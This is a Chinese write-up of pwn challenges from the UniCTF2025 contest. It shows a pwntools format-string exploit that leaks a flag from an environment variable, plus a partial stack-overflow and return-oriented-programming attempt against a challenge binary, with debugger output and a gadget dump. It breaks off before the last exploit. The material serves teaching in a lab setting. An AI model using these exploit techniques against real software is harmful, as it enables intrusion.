# [个人团队] UniCTF2025的Writeup

> **2026年1月25日10:00 ~ 2026年1月31日10:00**

> UniCTF 及 UnionCTF
> 由来自全国各地 10 所高校战队及社会安全组织 联合发起的网络安全竞赛正式开启。
>
> 本次赛事采用 4 人一组 的参赛形式，赛程持续一周，以“以赛促学、以赛促练”为核心理念，致力于打造一个高质量、强交流、重成长的网络安全竞技平台。
>
> 赛事特别设置 新生赛道 / 老生赛道 双赛制，兼顾不同基础与阶段的选手，营造公平、友好、积极向上的竞赛氛围，让每一位参赛者都能有所收获。
>
> 我们联合！成两面包夹芝士！！ 🧀🍞🧀
>
> 【联合主办】
> 中国民航大学
> 天津理工大学
> 天津大学
> 深圳大学
> 南昌航空大学科技学院
> 南开大学
> 哈尔滨理工大学
> 成都东软学院
> 安阳工学院
> 安徽工业经济职业技术学院



# Day0



# Day1



# Day2



# Day3

## Pwn

### speak(probie)**(复现)**

#### 题目信息

> 作者 An0ther 
>
> 48 队已解出本题
>
> # speak
>
> - 185分
> - Pwn
> - 动态环境
> - 简单
>
> Attempt to speak something.

#### 解题过程

**信息搜集**

```shell
file pwn
```

```shell
pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5c5fd055535efa73eaefd0f00074dd66e28fd59f, for GNU/Linux 3.2.0, not stripped
```

```shell
checksec --file=pwn
```

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   53 Symbols        No    0      4pwn
```

**分析**

- Linux64位小端序
- 保护全开

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  signed __int64 v3; // rax
  char s[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+108h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  init_seccomp();
  register_name();
  printf(welcome);
  memset(s, 0, 0x100uLL);
  read(0, s, 0x100uLL);
  printf(s);
  v3 = sys_exit(0);
  return 0;
}
```

```c
__int64 init_seccomp()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  strcpy(welcome, "attempt to speak something:\n");
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  seccomp_load(v1);
  return seccomp_release(v1);
}
```

```c
unsigned __int64 register_name()
{
  char s[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(s, 0, 0x30uLL);
  printf("Input your name: ");
  read(0, s, 0x30uLL);
  s[48] = 0;
  strcpy(name, s);
  fflush(_bss_start);
  return v2 - __readfsqword(0x28u);
}
```

```assembly
.bss:0000000000004060 name            db 20h dup(?)           ; DATA XREF: register_name+66↑o
.bss:0000000000004080                 public welcome
.bss:0000000000004080 ; char welcome[]
.bss:0000000000004080 welcome         dq ?                    ; DATA XREF: init_seccomp+2E↑w
.bss:0000000000004080                                         ; main+8C↑o
```

**分析**

- fmt
- 先尝试泄露环境变量

#### 题目答案

```python
from pwn import *

r = remote("nc1.ctfplus.cn", 37338)

payload = "probie".encode()
r.sendlineafter("name: ".encode(), payload)

payload = "%92$s".encode()
r.sendlineafter("something:\n".encode(), payload)

print(r.recvline().decode().strip())
```

**分析**

- 这道题应该是非预期，直接用%92$s读环境变量的值就能得到flag
- 正常的解法应该是，用fmt实现任意地址写进而劫持printf在栈上的返回地址或者exit调用链中libc的可写RW区域

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to nc1.ctfplus.cn on port 37338
[x] Opening connection to nc1.ctfplus.cn on port 37338: Trying 103.85.86.154
[+] Opening connection to nc1.ctfplus.cn on port 37338: Done
FLAG=UniCTF{d8f6aee5-279d-4cf8-a1db-f755944a78dd}
[*] Closed connection to nc1.ctfplus.cn port 37338

进程已结束，退出代码为 0
```

**得到：FLAG=UniCTF{d8f6aee5-279d-4cf8-a1db-f755944a78dd}**



# Day4

## Pwn

### Sur prize(probie)

#### 题目信息

> 作者 0wnerD1ed 
>
> 22 队已解出本题
>
> # Sur prize
>
> - 414分
> - Pwn
> - 动态环境
> - 简单
>
> Never Gonna Give Flag Up.

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- Linux64位小端序
- NX
- IBT

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  const char **v3; // rdx

  init(argc, argv, envp);
  lmao(argc);
  main(argc, argv, v3);
  return 0;
}
```

```c
int init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
```

```c
int lmao()
{
  char v0; // al
  int v1; // eax

  while ( alive )
  {
    v0 = S++;
    W = (__int64)(&h)[v0 & 7];
    x = 0;
    printf("\x1B[1;1H");
    while ( *(char *)W <= 125 )
    {
      c = *(char *)W - 58;
      if ( c <= 15 )
      {
        v1 = 1;
      }
      else if ( c <= 31 )
      {
        v1 = 2;
      }
      else
      {
        v1 = *(char *)++W - 56;
      }
      r = v1;
      c &= 0xFu;
      printf("\x1B[48;2;%d;%d;%dm", (unsigned __int8)BYTE2(g[c]), BYTE1(g[c]), (unsigned __int8)g[c]);
      i = 0;
      while ( i < r )
      {
        if ( x % 80 )
          printf(" ");
        else
          printf("\n ");
        ++i;
        ++x;
      }
      ++W;
    }
    usleep(Z / 3);
    if ( (unsigned int)gogogo() )
    {
      getchar();
      alive = 0;
    }
  }
  return printf("\x1B[2J\x1B[1;1H\x1B[0m");
}
```

```c
__int64 gogogo()
{
  unsigned int v0; // eax
  struct termios v2; // [rsp+0h] [rbp-90h] BYREF
  termios termios_p; // [rsp+40h] [rbp-50h] BYREF
  int c; // [rsp+88h] [rbp-8h]
  unsigned int v5; // [rsp+8Ch] [rbp-4h]

  tcgetattr(0, &termios_p);
  *(_QWORD *)&v2.c_iflag = *(_QWORD *)&termios_p.c_iflag;
  v2.c_cflag = termios_p.c_cflag;
  *(_QWORD *)&v2.c_line = *(_QWORD *)&termios_p.c_line;
  *(_QWORD *)&v2.c_cc[7] = *(_QWORD *)&termios_p.c_cc[7];
  *(_QWORD *)&v2.c_cc[15] = *(_QWORD *)&termios_p.c_cc[15];
  *(_DWORD *)&v2.c_cc[23] = *(_DWORD *)&termios_p.c_cc[23];
  *(_QWORD *)&v2.c_cc[27] = *(_QWORD *)&termios_p.c_cc[27];
  *(_QWORD *)&v2.c_ispeed = *(_QWORD *)&termios_p.c_ispeed;
  v2.c_lflag = termios_p.c_lflag & 0xFFFFFFF5;
  tcsetattr(0, 0, &v2);
  v0 = fcntl(0, 3, 0LL);
  v5 = v0;
  BYTE1(v0) |= 8u;
  fcntl(0, 4, v0);
  c = getchar();
  tcsetattr(0, 0, &termios_p);
  fcntl(0, 4, v5);
  if ( c == -1 )
    return 0LL;
  ungetc(c, stdin);
  return 1LL;
}
```

```c
// bad sp value at call has been detected, the output may be wrong!
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp-48h] [rbp-48h] BYREF

  gets(&v4, argv, envp, 8LL);
  return 0;
}
```

```c
signed __int64 wutihave()
{
  const char *envp; // [rsp+0h] [rbp-28h] BYREF
  const char *argv[4]; // [rsp+8h] [rbp-20h] BYREF

  argv[3] = "/bin/ls";
  argv[0] = "/bin/ls";
  argv[1] = 0LL;
  argv[2] = 0LL;
  envp = 0LL;
  return sys_execve("/bin/ls", argv, &envp);
}
```

```c
ssize_t __fastcall leimicc(const char *a1)
{
  const char *envp; // [rsp+18h] [rbp-C8h] BYREF
  const char *argv[4]; // [rsp+20h] [rbp-C0h] BYREF
  stat buf; // [rsp+40h] [rbp-A0h] BYREF
  const char *filename; // [rsp+D8h] [rbp-8h]

  if ( stat(a1, &buf) )
    return write(1, "No such file or directory\n", 0x1AuLL);
  filename = "/bin/cat";
  argv[0] = "/bin/cat";
  argv[1] = a1;
  argv[2] = 0LL;
  envp = 0LL;
  return sys_execve("/bin/cat", argv, &envp);
}
```

**解读**

- `main`是主函数
- `init`是初始化函数
- `lmao`是动画播放函数，按回车键退出
- `gogogo`是屏幕重置函数
- `_main`是题目主要函数，存在一个`gets`栈溢出漏洞
- `wutihave`是执行`ls`的后门函数
- `leimicc`是执行`cat`的后门函数，需要传递一个文件名地址作为参数

先尝试执行`ls`

**尝试脚本**

```python
from pwn import *

r = process(["./pwn"])
elf = ELF("./pwn")

gdb.attach(r, "b *0x401778")

r.sendline()

wutihave_elf_addr = elf.sym["wutihave"]

payload = cyclic(0x48)
payload += p64(wutihave_elf_addr)
r.sendlineafter("\x1b[0m".encode(), payload)

r.interactive()
```

```shell
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
*RAX  0x7ffecd2302f8 ◂— 0x6161616261616161 ('aaaabaaa')
 RBX  0x7ffecd230478 —▸ 0x7ffecd2311a4 ◂— 0x4f43006e77702f2e /* './pwn' */
*RCX  0x7f4e69c448e0 (_IO_2_1_stdin_) ◂— 0xfbad20ab
 RDX  0
*RDI  0x7f4e69c467c0 (_IO_stdfile_0_lock) ◂— 0
*RSI  0x7f4e69c44963 (_IO_2_1_stdin_+131) ◂— 0xc467c0000000000a /* '\n' */
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7ffecd230488 —▸ 0x7ffecd2311aa ◂— 'COLORFGBG=15;0'
 R14  0x7f4e69cab000 (_rtld_global) —▸ 0x7f4e69cac310 ◂— 0
 R15  0x403d88 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401240 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffecd230330 ◂— 0x616161706161616f ('oaaapaaa')
*RSP  0x7ffecd2302f8 ◂— 0x6161616261616161 ('aaaabaaa')
*RIP  0x7f4e69adca59 (gets+137) ◂— ret 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x7f4e69adca59 <gets+137>    ret                                <0x6161616261616161>
    ↓









─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rax rsp 0x7ffecd2302f8 ◂— 0x6161616261616161 ('aaaabaaa')
01:0008│-030     0x7ffecd230300 ◂— 0x6161616461616163 ('caaadaaa')
02:0010│-028     0x7ffecd230308 ◂— 0x6161616661616165 ('eaaafaaa')
03:0018│-020     0x7ffecd230310 ◂— 0x6161616861616167 ('gaaahaaa')
04:0020│-018     0x7ffecd230318 ◂— 0x6161616a61616169 ('iaaajaaa')
05:0028│-010     0x7ffecd230320 ◂— 0x6161616c6161616b ('kaaalaaa')
06:0030│-008     0x7ffecd230328 ◂— 0x6161616e6161616d ('maaanaaa')
07:0038│ rbp     0x7ffecd230330 ◂— 0x616161706161616f ('oaaapaaa')
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x7f4e69adca59 gets+137
   1 0x6161616261616161 None
   2 0x6161616461616163 None
   3 0x6161616661616165 None
   4 0x6161616861616167 None
   5 0x6161616a61616169 None
   6 0x6161616c6161616b None
   7 0x6161616e6161616d None
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ rax rsp 0x7ffecd2302f8 ◂— 0x6161616261616161 ('aaaabaaa')
01:0008│-030     0x7ffecd230300 ◂— 0x6161616461616163 ('caaadaaa')
02:0010│-028     0x7ffecd230308 ◂— 0x6161616661616165 ('eaaafaaa')
03:0018│-020     0x7ffecd230310 ◂— 0x6161616861616167 ('gaaahaaa')
04:0020│-018     0x7ffecd230318 ◂— 0x6161616a61616169 ('iaaajaaa')
05:0028│-010     0x7ffecd230320 ◂— 0x6161616c6161616b ('kaaalaaa')
06:0030│-008     0x7ffecd230328 ◂— 0x6161616e6161616d ('maaanaaa')
07:0038│ rbp     0x7ffecd230330 ◂— 0x616161706161616f ('oaaapaaa')
08:0040│+008     0x7ffecd230338 ◂— 0x6161617261616171 ('qaaaraaa')
09:0048│+010     0x7ffecd230340 —▸ 0x401653 (wutihave) ◂— endbr64 
0a:0050│+018     0x7ffecd230348 —▸ 0x401700 (leimicc+94) ◂— add byte ptr [rax], al
0b:0058│+020     0x7ffecd230350 —▸ 0x7ffecd230478 —▸ 0x7ffecd2311a4 ◂— 0x4f43006e77702f2e /* './pwn' */
0c:0060│+028     0x7ffecd230358 ◂— 0x1cd2303f0
0d:0068│+030     0x7ffecd230360 ◂— 1
0e:0070│+038     0x7ffecd230368 —▸ 0x7f4e69a86ca8 (__libc_start_call_main+120) ◂— mov edi, eax
0f:0078│+040     0x7ffecd230370 —▸ 0x7ffecd230460 —▸ 0x7ffecd230468 ◂— 0x38 /* '8' */
10:0080│+048     0x7ffecd230378 —▸ 0x401789 (main) ◂— endbr64 
11:0088│+050     0x7ffecd230380 ◂— 0x100400040 /* '@' */
12:0090│+058     0x7ffecd230388 —▸ 0x7ffecd230478 —▸ 0x7ffecd2311a4 ◂— 0x4f43006e77702f2e /* './pwn' */
13:0098│+060     0x7ffecd230390 —▸ 0x7ffecd230478 —▸ 0x7ffecd2311a4 ◂— 0x4f43006e77702f2e /* './pwn' */
```

**分析**

- 我们可以看到这题并没有想象中的那么简单
- 它的栈布局十分混乱
- RIP直接就指向了我们写入的`v4`

我们顺应调试数据，再次尝试执行`ls`

**尝试脚本**

```python
from pwn import *

r = remote("nc1.ctfplus.cn", 26288)
# r = process(["./pwn"])
elf = ELF("./pwn")

# gdb.attach(r, "b *0x401778")

r.sendline()

wutihave_elf_addr = elf.sym["wutihave"]

payload = p64(wutihave_elf_addr)
r.sendlineafter("\x1b[0m".encode(), payload)

r.interactive()
```

```shell
[*] Switching to interactive mode
flag_cda2e1974c7f9dfd3698e39d486634c9
vuln
[*] Got EOF while reading in interactive
```

**得到Flag文件的文件名：flag_cda2e1974c7f9dfd3698e39d486634c9**

我们接下来要给`leimicc`函数传参，并调用`leimicc`函数

因为我们程序里没有现成的文件名，所以我们要先用`gets`在`bss`段写入我们的文件名

然后再给`leimicc`传入我们写入文件名的地址，再调用`leimicc`函数

查找一下有没有我们需要的`gadget-rop`的汇编指令

**数据搜集**

```shell
ropper -f pwn --search "pop"
```

```shell
0x000000000040125d: pop rbp; ret;
```

**分析**

- 很不幸没有现成的`pop rdi; ret;`这应该也是这题最难的点了
- 我们看看有没有其他的汇编指令可以辅助我们间接修改`rdi`寄存器的地址参数

**数据搜集**

```shell
ropper -f pwn --search ""
```

```shell
0x000000000040121e: adc dword ptr [rax], edi; test rax, rax; je 0x1230; mov edi, 0x4043c0; jmp rax; 
0x00000000004011b0: adc eax, 0x2e3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x00000000004015e7: adc eax, 0x90fffffb; pop rbp; ret; 
0x00000000004011dc: adc edi, dword ptr [rax]; test rax, rax; je 0x11f0; mov edi, 0x4043c0; jmp rax; 
0x000000000040124c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x11d0; mov byte ptr [rip + 0x318b], 1; pop rbp; ret; 
0x00000000004011b4: add ah, dh; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x00000000004015e5: add al, ch; adc eax, 0x90fffffb; pop rbp; ret; 
0x0000000000401317: add al, ch; ret; 
0x00000000004011ae: add bh, bh; adc eax, 0x2e3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x0000000000401391: add bl, ch; add eax, 0xb8; add cl, cl; ret; 
0x000000000040168d: add byte ptr [rax - 0x75], cl; clc; lea rsi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall; 
0x0000000000401731: add byte ptr [rax - 0x75], cl; clc; lea rsi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; 
0x000000000040100e: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004015e3: add byte ptr [rax], al; add al, ch; adc eax, 0x90fffffb; pop rbp; ret; 
0x0000000000401315: add byte ptr [rax], al; add al, ch; ret; 
0x000000000040138f: add byte ptr [rax], al; add bl, ch; add eax, 0xb8; add cl, cl; ret; 
0x00000000004015e2: add byte ptr [rax], al; add byte ptr [rax], al; call 0x1100; nop; pop rbp; ret; 
0x00000000004017b1: add byte ptr [rax], al; add byte ptr [rax], al; call 0x174b; mov eax, 0; leave; ret; 
0x00000000004011de: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x11f0; mov edi, 0x4043c0; jmp rax;                                                                                                             
0x0000000000401220: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x1230; mov edi, 0x4043c0; jmp rax;                                                                                                             
0x00000000004011bc: add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret; 
0x0000000000401395: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x0000000000401056: add byte ptr [rax], al; add cl, ch; ret 0xffff; 
0x0000000000401396: add byte ptr [rax], al; add cl, cl; ret; 
0x00000000004015e4: add byte ptr [rax], al; call 0x1100; nop; pop rbp; ret; 
0x00000000004017b3: add byte ptr [rax], al; call 0x174b; mov eax, 0; leave; ret; 
0x000000000040168c: add byte ptr [rax], al; mov rcx, qword ptr [rbp - 8]; lea rsi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall;                                                                                        
0x0000000000401730: add byte ptr [rax], al; mov rcx, qword ptr [rbp - 8]; lea rsi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall;                                                                                        
0x0000000000401646: add byte ptr [rax], al; mov rdi, rax; call 0x1150; nop; pop rbp; ret; 
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x1016; call rax; 
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x1016; call rax; add rsp, 8; ret; 
0x00000000004011e0: add byte ptr [rax], al; test rax, rax; je 0x11f0; mov edi, 0x4043c0; jmp rax; 
0x0000000000401222: add byte ptr [rax], al; test rax, rax; je 0x1230; mov edi, 0x4043c0; jmp rax; 
0x00000000004017c2: add byte ptr [rax], al; endbr64; sub rsp, 8; add rsp, 8; ret; 
0x00000000004011be: add byte ptr [rax], al; endbr64; ret; 
0x00000000004011b3: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x0000000000401397: add byte ptr [rax], al; leave; ret; 
0x0000000000401555: add byte ptr [rbx + 0x2e9c15], cl; add byte ptr [rbx + 0x2ea605], cl; add byte ptr [rcx], bh; ret 0x837c;                                                                                                         
0x000000000040155b: add byte ptr [rbx + 0x2ea605], cl; add byte ptr [rcx], bh; ret 0x837c; 
0x000000000040125b: add byte ptr [rcx], al; pop rbp; ret; 
0x0000000000401561: add byte ptr [rcx], bh; ret 0x837c; 
0x00000000004011b2: add byte ptr cs:[rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x0000000000401058: add cl, ch; ret 0xffff; 
0x0000000000401398: add cl, cl; ret; 
0x00000000004011ad: add dil, dil; adc eax, 0x2e3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x000000000040154f: add dword ptr [rcx + 0x2eaa05], ecx; add byte ptr [rbx + 0x2e9c15], cl; add byte ptr [rbx + 0x2ea605], cl; add byte ptr [rcx], bh; ret 0x837c;                                                                    
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x1016; call rax; 
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x1016; call rax; add rsp, 8; ret; 
0x0000000000401393: add eax, 0xb8; add cl, cl; ret; 
0x0000000000401017: add esp, 8; ret; 
0x0000000000401016: add rsp, 8; ret; 
0x00000000004015e6: call 0x1100; nop; pop rbp; ret; 
0x0000000000401778: call 0x1130; xor eax, eax; test eax, eax; jne 0x1785; leave; ret; 
0x000000000040164b: call 0x1150; nop; pop rbp; ret; 
0x0000000000401251: call 0x11d0; mov byte ptr [rip + 0x318b], 1; pop rbp; ret; 
0x00000000004017ab: call 0x139b; mov eax, 0; call 0x174b; mov eax, 0; leave; ret; 
0x00000000004017b5: call 0x174b; mov eax, 0; leave; ret; 
0x00000000004011af: call qword ptr [rip + 0x2e3b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x0000000000401014: call rax; 
0x0000000000401014: call rax; add rsp, 8; ret; 
0x00000000004011b1: cmp ebp, dword ptr [rsi]; add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;                                                                                                                 
0x00000000004012f1: dec dword ptr [rax - 0x77]; ret 0xbe; 
0x0000000000401743: dec dword ptr [rax - 0x77]; iretd; syscall; 
0x0000000000401743: dec dword ptr [rax - 0x77]; iretd; syscall; leave; ret; 
0x0000000000401699: fmul dword ptr [rax - 0x77]; iretd; syscall; 
0x0000000000401699: fmul dword ptr [rax - 0x77]; iretd; syscall; nop; pop rbp; ret; 
0x0000000000401006: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x1016; call rax; 
0x0000000000401012: je 0x1016; call rax; 
0x0000000000401012: je 0x1016; call rax; add rsp, 8; ret; 
0x00000000004011db: je 0x11f0; mov eax, 0; test rax, rax; je 0x11f0; mov edi, 0x4043c0; jmp rax; 
0x00000000004011e5: je 0x11f0; mov edi, 0x4043c0; jmp rax; 
0x000000000040121d: je 0x1230; mov eax, 0; test rax, rax; je 0x1230; mov edi, 0x4043c0; jmp rax; 
0x0000000000401227: je 0x1230; mov edi, 0x4043c0; jmp rax; 
0x000000000040103d: jmp qword ptr [rsi - 0x70]; 
0x00000000004011ec: jmp rax; 
0x0000000000401694: jne 0x1676; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall; 
0x0000000000401781: jne 0x1785; leave; ret; 
0x0000000000401697: lea edx, [rbp - 0x28]; mov rdi, rcx; syscall; 
0x000000000040173e: lea edx, [rbp - 0xc8]; mov rdi, rcx; syscall; 
0x000000000040173e: lea edx, [rbp - 0xc8]; mov rdi, rcx; syscall; leave; ret; 
0x0000000000401693: lea esi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall; 
0x0000000000401737: lea esi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; 
0x0000000000401737: lea esi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; leave; ret; 
0x0000000000401696: lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall; 
0x000000000040173d: lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; 
0x000000000040173d: lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; leave; ret; 
0x0000000000401692: lea rsi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall; 
0x0000000000401736: lea rsi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; 
0x0000000000401736: lea rsi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; leave; ret; 
0x0000000000401256: mov byte ptr [rip + 0x318b], 1; pop rbp; ret; 
0x00000000004015e1: mov eax, 0; call 0x1100; nop; pop rbp; ret; 
0x00000000004017b0: mov eax, 0; call 0x174b; mov eax, 0; leave; ret; 
0x00000000004011dd: mov eax, 0; test rax, rax; je 0x11f0; mov edi, 0x4043c0; jmp rax; 
0x000000000040121f: mov eax, 0; test rax, rax; je 0x1230; mov edi, 0x4043c0; jmp rax; 
0x0000000000401394: mov eax, 0; leave; ret; 
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; add rsp, 8; ret; 
0x000000000040124f: mov ebp, esp; call 0x11d0; mov byte ptr [rip + 0x318b], 1; pop rbp; ret; 
0x000000000040168f: mov ecx, dword ptr [rbp - 8]; lea rsi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall;                                                                                                                
0x0000000000401733: mov ecx, dword ptr [rbp - 8]; lea rsi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall;                                                                                                                
0x00000000004011e7: mov edi, 0x4043c0; jmp rax; 
0x0000000000401649: mov edi, eax; call 0x1150; nop; pop rbp; ret; 
0x00000000004015df: mov edi, eax; mov eax, 0; call 0x1100; nop; pop rbp; ret; 
0x000000000040169b: mov edi, ecx; syscall; 
0x0000000000401745: mov edi, ecx; syscall; leave; ret; 
0x000000000040169b: mov edi, ecx; syscall; nop; pop rbp; ret; 
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; add rsp, 8; ret; 
0x000000000040124e: mov rbp, rsp; call 0x11d0; mov byte ptr [rip + 0x318b], 1; pop rbp; ret; 
0x000000000040168e: mov rcx, qword ptr [rbp - 8]; lea rsi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall;                                                                                                                
0x0000000000401732: mov rcx, qword ptr [rbp - 8]; lea rsi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall;                                                                                                                
0x0000000000401648: mov rdi, rax; call 0x1150; nop; pop rbp; ret; 
0x00000000004015de: mov rdi, rax; mov eax, 0; call 0x1100; nop; pop rbp; ret; 
0x000000000040169a: mov rdi, rcx; syscall; 
0x0000000000401744: mov rdi, rcx; syscall; leave; ret; 
0x000000000040169a: mov rdi, rcx; syscall; nop; pop rbp; ret; 
0x00000000004011b8: nop dword ptr [rax + rax]; endbr64; ret; 
0x00000000004011b7: nop dword ptr cs:[rax + rax]; endbr64; ret; 
0x00000000004011b6: nop word ptr cs:[rax + rax]; endbr64; ret; 
0x0000000000401007: or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x1016; call rax; 
0x00000000004011e6: or dword ptr [rdi + 0x4043c0], edi; jmp rax; 
0x000000000040125d: pop rbp; ret; 
0x0000000000401698: push rbp; fmul dword ptr [rax - 0x77]; iretd; syscall; 
0x000000000040124d: push rbp; mov rbp, rsp; call 0x11d0; mov byte ptr [rip + 0x318b], 1; pop rbp; ret; 
0x0000000000401327: ret 0x4be; 
0x0000000000401563: ret 0x837c; 
0x00000000004012f4: ret 0xbe; 
0x0000000000401508: ret 0xd089; 
0x00000000004014fe: ret 0xfac1; 
0x000000000040105a: ret 0xffff; 
0x00000000004011e8: rol byte ptr [rbx + 0x40], 0; jmp rax; 
0x0000000000401780: sal byte ptr [rbp + 2], 0xc9; ret; 
0x0000000000401011: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004017c9: sub esp, 8; add rsp, 8; ret; 
0x0000000000401005: sub esp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x00000000004017c8: sub rsp, 8; add rsp, 8; ret; 
0x0000000000401004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x00000000004011ba: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret; 
0x0000000000401010: test eax, eax; je 0x1016; call rax; 
0x0000000000401010: test eax, eax; je 0x1016; call rax; add rsp, 8; ret; 
0x00000000004011e3: test eax, eax; je 0x11f0; mov edi, 0x4043c0; jmp rax; 
0x0000000000401225: test eax, eax; je 0x1230; mov edi, 0x4043c0; jmp rax; 
0x000000000040177f: test eax, eax; jne 0x1785; leave; ret; 
0x000000000040100f: test rax, rax; je 0x1016; call rax; 
0x000000000040100f: test rax, rax; je 0x1016; call rax; add rsp, 8; ret; 
0x00000000004011e2: test rax, rax; je 0x11f0; mov edi, 0x4043c0; jmp rax; 
0x0000000000401224: test rax, rax; je 0x1230; mov edi, 0x4043c0; jmp rax; 
0x0000000000401259: xor dword ptr [rax], eax; add byte ptr [rcx], al; pop rbp; ret; 
0x000000000040177d: xor eax, eax; test eax, eax; jne 0x1785; leave; ret; 
0x0000000000401691: clc; lea rsi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall; 
0x0000000000401735: clc; lea rsi, [rbp - 0xc0]; lea rdx, [rbp - 0xc8]; mov rdi, rcx; syscall; 
0x00000000004017c7: cli; sub rsp, 8; add rsp, 8; ret; 
0x0000000000401003: cli; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x00000000004011c3: cli; ret; 
